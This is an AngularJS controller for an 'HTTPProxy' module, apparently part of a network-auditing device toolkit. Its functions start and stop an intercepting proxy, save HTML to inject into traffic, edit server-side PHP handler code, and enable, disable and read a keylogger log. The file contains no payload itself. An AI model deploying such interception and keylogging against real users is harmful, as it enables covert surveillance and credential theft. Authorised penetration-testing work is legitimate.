registerController('HTTPProxyPortalController', ['$api', '$scope', function($api, $scope) {

$scope.htmlValue="";

$scope.handleRequest = function (action) {

    if(action=="Start"){

    $api.request({
        module: 'HTTPProxy',
        action: 'Start'   //Your action defined in module.php
    }, function(response) {

        $scope.resp = response;
        console.log(response)
    });

    }

    if(action=="Stop"){

    $api.request({
        module: 'HTTPProxy',
        action: 'Stop'   //Your action defined in module.php
    }, function(response) {

            $scope.resp = response;

        console.log(response)
    });

    }

    }

$scope.saveHtml = function () {

//save HTML into File.
    $api.request({
        module: 'HTTPProxy',
        action: 'save'   ,
        htmlvalue:$scope.htmlValue

    }, function(response) {
            $scope.resp = response;

        console.log(response)
    });

}


 $scope.FunCall = function () {
// get HTML

   $api.request({
        module: 'HTTPProxy',
        action: 'getHtml'

    }, function(response) {
        $scope.htmlValue = response;
        console.log(response)
    });

   }


$scope.viewResponsePage = function () {
       $api.request({
        module: 'HTTPProxy',
        action: 'viewResponsePage'

    }, function(response) {

            $scope.phpCode = response

        console.log(response)
    });

}


$scope.updateResponsePage = function () {
       $api.request({
        module: 'HTTPProxy',
        action: 'updateResponsePage' ,
        phpCode:$scope.phpCode

    }, function(response) {

            $scope.resp = response

        console.log(response)
    });

}

$scope.viewLog = function () {

        $api.request({
        module: 'HTTPProxy',
        action: 'viewLog'

    }, function(response) {

            $scope.logFile = response

        console.log(response)
    });


}


$scope.enableKeyLogger = function () {

        $api.request({
        module: 'HTTPProxy',
        action: 'enableKeyLogger'

    }, function(response) {

           // $scope.resp = response
            document.getElementById("htmlvalue").value= response

        console.log(response)
});


   }


$scope.disableKeyLogger = function () {

        $api.request({
        module: 'HTTPProxy',
        action: 'disableKeyLogger'

    }, function(response) {
        document.getElementById("htmlvalue").value= response
        console.log(response)
    });
}

$scope.viewKeyLoggerLog = function () {

        $api.request({
        module: 'HTTPProxy',
        action: 'viewKeyLoggerLog'

    }, function(response) {
            $scope.viewKeyLoggerLogText = response

        console.log(response)
    });


}

/*$scope.options = [
        {
          name: 'Full URLs',
          value: '1'
        },
        {
          name: 'Specific URLs',
          value: '2'
        },
        {
          name: 'Exclude URLs',
          value: '3'
        }
    ];

    $scope.selectedOption = $scope.options[0];

   $scope.updateSelected = function() {

  }

$scope.saveInjectionScope = function () {


        $api.request({
        module: 'HTTPProxy',
        action: 'saveInjectionScope',
        selectedOption:$scope.selectedOption.value,
        specificUrls:$scope.specificUrls,
        excludeUrls:$scope.excludeUrls
    }, function(response) {


            $scope.resp = response

        console.log(response)
    });


   }
 */



$scope.viewHTTPProxyHandler = function () {
        $api.request({
        module: 'HTTPProxy',
        action: 'viewHTTPProxyHandler'
    }, function(response) {
          $scope.HTTPProxyHandlerCode = response
        console.log(response)
    });


}



$scope.updateHTTPProxyHandlerPage = function () {
       $api.request({
        module: 'HTTPProxy',
        action: 'updateHTTPProxyHandlerPage' ,
        HTTPProxyHandlerCode:$scope.HTTPProxyHandlerCode

    }, function(response) {

         $scope.HTTPProxyHandlerResp = response
        console.log(response)
    });

    }




}]);


